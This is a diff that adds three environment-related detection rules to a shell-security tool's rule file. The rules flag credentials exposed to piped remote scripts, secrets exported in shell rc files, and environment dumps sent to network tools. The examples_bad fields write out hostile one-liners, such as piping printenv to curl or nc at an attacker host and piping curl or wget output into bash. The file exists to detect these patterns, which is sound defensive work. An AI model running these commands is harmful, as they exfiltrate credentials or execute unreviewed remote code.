@@ -2138,3 +2138,39 @@ examples_good = ["an alias you just added yourself while configuring your shell 
 false_positive_guidance = "If you just edited your rc file, every alias in it looks recent. This is Info-only context, not an alert — pair it with the other alias rules to decide whether to investigate."
 remediation = "If you did not recently edit the rc file shown in the finding location, review the added aliases/functions and investigate what modified the file."
 mitre_id = "T1546.004"
+
+[[rule]]
+id = "env_sensitive_exposed_to_unknown_script"
+title = "Sensitive env var exposed to an unknown downloaded script"
+category = "environment"
+severity_rationale = "High — when a sensitive environment variable (an AWS key, GitHub/npm/PyPI token, OpenAI/Anthropic/Stripe API key, …) is set in your shell AND you pipe remote content straight into an interpreter (`curl … | bash`), the downloaded script inherits the entire environment and can read and exfiltrate every secret. The combination of a live credential and a sight-unseen script is the canonical supply-chain credential-theft setup."
+description = "`engine::analyze` (with `env_guard_enabled`) found one or more sensitive env vars set while the command pipes a network fetch into a shell. The finding lists the exposed variable NAMES only — never the values. This is the dedicated rule the `--suggest-safe-command` env-scrub rewrite attaches to, suggesting `env -u VAR … <cmd>` to strip the secrets for that one invocation."
+examples_bad = ["AWS_SECRET_ACCESS_KEY set, then `curl https://get.example.sh | bash`", "GITHUB_TOKEN exported, then `wget -qO- https://install.example | sh`"]
+examples_good = ["Download to a file, review it, then run it with a scrubbed environment: `env -u AWS_SECRET_ACCESS_KEY bash ./install.sh`"]
+false_positive_guidance = "A trusted vendor install script you have already reviewed will still trip this whenever credentials are in your environment — that is the point. Scrub the secrets for the invocation (`env -u VAR …`) or run the reviewed script from a file rather than a live pipe."
+remediation = "Do not pipe untrusted remote content into a shell while credentials are set. Download and review the script first, and run it with `env -u VAR …` to strip sensitive variables for that single invocation. Rotate any secret you suspect a script already saw."
+mitre_id = "T1552.001"
+
+[[rule]]
+id = "env_sensitive_persisted_in_shell_rc"
+title = "Sensitive env var exported in a shell rc/profile"
+category = "environment"
+severity_rationale = "High — a credential `export`ed in `~/.bashrc` / `~/.zshrc` / fish config is loaded into every interactive shell, persists indefinitely, and is readable by anything that can read your rc file or your process environment. Long-lived plaintext credentials in shell config are a frequent source of leaks (committed dotfiles, shared screenshots, backups)."
+description = "`tirith env guard` parsed your rc/profile files and found a `export NAME=…` (or fish `set -x` / PowerShell `$env:`) for a name on the sensitive list. The finding reports the file + line with the value MASKED to `****`; tirith never reads or prints the value."
+examples_bad = ["export AWS_SECRET_ACCESS_KEY=AKIA… in ~/.zshrc", "set -x GITHUB_TOKEN ghp_… in ~/.config/fish/config.fish"]
+examples_good = ["Load secrets from a secrets manager or `.env` file sourced on demand, not exported globally in your rc", "Reference an OS keychain entry instead of inlining the literal value"]
+false_positive_guidance = "A non-secret variable that merely shares a name pattern is unlikely here — the sensitive list is a curated set of well-known credential names. If you have a deliberate reason to export a secret (a single-user dev box), this is informational, but prefer on-demand loading."
+remediation = "Remove the credential from your rc/profile and load it on demand (secrets manager, OS keychain, or an explicitly-sourced `.env`). Rotate the credential, since a value persisted in shell config may already have leaked."
+mitre_id = "T1552.001"
+
+[[rule]]
+id = "env_printenv_to_network_sink"
+title = "Environment dumped to a network sink"
+category = "environment"
+severity_rationale = "Medium — `printenv` / `env` piped into a network tool (`curl`, `wget`, `nc`) sends every environment variable, including any secrets, off the machine in one line. It is reported at Medium rather than High because the shape is sometimes used deliberately for debugging, but it is a classic one-liner exfiltration primitive."
+description = "`engine::analyze` (with `env_guard_enabled`) found a bare `printenv` or argument-free `env` piped into a network sink. `env FOO=1 some-cmd` (which RUNS a command rather than printing the environment) does NOT fire."
+examples_bad = ["printenv | curl -d @- https://attacker.example", "env | nc attacker.example 4444"]
+examples_good = ["printenv | less — inspect your environment locally with no network sink", "printenv AWS_REGION — print a single non-secret variable"]
+false_positive_guidance = "A debugging one-liner that posts your environment to a paste service you control will trip this. Confirm the destination host is yours; prefer redacting secrets before sending an environment dump anywhere."
+remediation = "Do not pipe your full environment to a network destination. If you must share environment state for debugging, redact secrets first (or unset them) and send only the specific non-sensitive variables you need."
+mitre_id = "T1041"
